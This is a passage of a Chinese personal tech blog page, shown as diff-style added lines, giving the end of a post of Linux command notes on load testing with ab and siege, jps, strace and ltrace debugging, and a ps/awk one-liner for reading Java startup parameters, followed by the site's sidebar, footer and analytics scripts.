+<h2 id="服务程序"><a href="#服务程序" class="headerlink" title="服务程序"></a>服务程序</h2><h3 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab 工具（Apache 中自带）可以简单粗暴地检查 web 服务器的性能。对于更复杂的负载测试，使用 siege</span><br></pre></td></tr></table></figure>
+<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>Jps</p>
+<h3 id="程序试错检查"><a href="#程序试错检查" class="headerlink" title="程序试错检查"></a>程序试错检查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">了解 strace 和 ltrace。这俩工具在你的程序运行失败、挂起甚至崩溃，而你却不知道为什么或你想对性能有个总体的认识的时候是非常有用的。注意 profile 参数（-c）和附加到一个运行的进程参数 （-p）</span><br><span class="line"></span><br><span class="line">strace：调试系统调用</span><br><span class="line">strace 经常被认为是程序员的调试工具，但它的功用不仅仅用来调试。它可以截获和记录进程调用系统的情况。因而，它是一个实用的诊断、教学和调试工具。比如说，你可以使用strace来查出某个程序在启动时实际上使用哪个配置文件。</span><br><span class="line"></span><br><span class="line">不过strace的确有一个缺陷。它在检查某个进程时，该进程的性能会一落千丈。因而，只有在我已经有极其充分的理由认为某个程序引起问题的情况下，才使用strace</span><br></pre></td></tr></table></figure>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取java_server_name的第18列值，等号分隔。尤其适合java -jar多个参数的场景</span><br><span class="line">ps -ef|grep java_server_name|awk &apos;&#123;print $18&#125;&apos;|cut -d = -f 2</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>赏个钱</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat_pay.png" alt="Skyler 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Skyler
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/" title="linux常用命令草集">https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/25/linux自定义实现一个免登陆远程机器的脚本/" rel="next" title="linux自定义实现一个免登陆远程机器的脚本">
+                <i class="fa fa-chevron-left"></i> linux自定义实现一个免登陆远程机器的脚本
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/23/服务可用性的思考/" rel="prev" title="服务可用性的思考">
+                服务可用性的思考 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/tao.jpg" alt="Skyler">
+            
+              <p class="site-author-name" itemprop="name">Skyler</p>
+              <p class="site-description motion-element" itemprop="description">个人技术博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yaoyuanyy" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yaoyihao1@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://juejin.im/user/585b94018d6d810065d34497/posts" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#可能你不知道的个人常用命令杂集"><span class="nav-number">1.</span> <span class="nav-text">可能你不知道的个人常用命令杂集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊符号的应用"><span class="nav-number">2.</span> <span class="nav-text">特殊符号的应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#d"><span class="nav-number">2.1.</span> <span class="nav-text">! -d</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">2.2.</span> <span class="nav-text">!$</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">2.3.</span> <span class="nav-text">!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#从历史记录中使用命令号来运行命令"><span class="nav-number">2.4.</span> <span class="nav-text">从历史记录中使用命令号来运行命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统信息"><span class="nav-number">3.</span> <span class="nav-text">系统信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cat-proc-系统信息"><span class="nav-number">3.1.</span> <span class="nav-text">cat /proc 系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#uname"><span class="nav-number">3.2.</span> <span class="nav-text">uname</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络"><span class="nav-number">4.</span> <span class="nav-text">网络</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#网络连接-进程端口"><span class="nav-number">4.1.</span> <span class="nav-text">网络连接(进程端口)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ss"><span class="nav-number">4.1.1.</span> <span class="nav-text">ss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lsof-list-open-files"><span class="nav-number">4.1.2.</span> <span class="nav-text">lsof - list open files</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络管理"><span class="nav-number">4.2.</span> <span class="nav-text">网络管理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ip-show-manipulate-routing-devices-policy-routing-and-tunnels"><span class="nav-number">4.2.1.</span> <span class="nav-text">ip - show / manipulate routing, devices, policy routing and tunnels</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ifconfig-configure-a-network-interface"><span class="nav-number">4.2.2.</span> <span class="nav-text">ifconfig - configure a network interface</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dig-DNS-lookup-utility"><span class="nav-number">4.2.3.</span> <span class="nav-text">dig - DNS lookup utility</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络调试-网络诊断"><span class="nav-number">4.3.</span> <span class="nav-text">网络调试(网络诊断)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wireshark"><span class="nav-number">4.3.1.</span> <span class="nav-text">wireshark</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc-netcat-Concatenate-and-redirect-sockets"><span class="nav-number">4.3.2.</span> <span class="nav-text">nc - netcat - Concatenate and redirect sockets</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#网络调试"><span class="nav-number">4.3.2.1.</span> <span class="nav-text">网络调试</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vimdiff-edit-two-three-or-four-versions-of-a-file-with-Vim-and-show-differences"><span class="nav-number">4.3.3.</span> <span class="nav-text">vimdiff - edit two, three or four versions of a file with Vim and show differences</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务程序"><span class="nav-number">5.</span> <span class="nav-text">服务程序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#压测"><span class="nav-number">5.1.</span> <span class="nav-text">压测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java"><span class="nav-number">5.2.</span> <span class="nav-text">java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序试错检查"><span class="nav-number">5.3.</span> <span class="nav-text">程序试错检查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用命令"><span class="nav-number">6.</span> <span class="nav-text">常用命令</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Skyler</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://skyler.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/';
+          this.page.identifier = '2019/10/23/linux常用命令草集/';
+          this.page.title = 'linux常用命令草集';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://skyler.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("z1rh3HBfRJYf4gqQXC1RjVAC-gzGzoHsz", "cFSlIdGSSY8cjFbc0bTewxKq");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
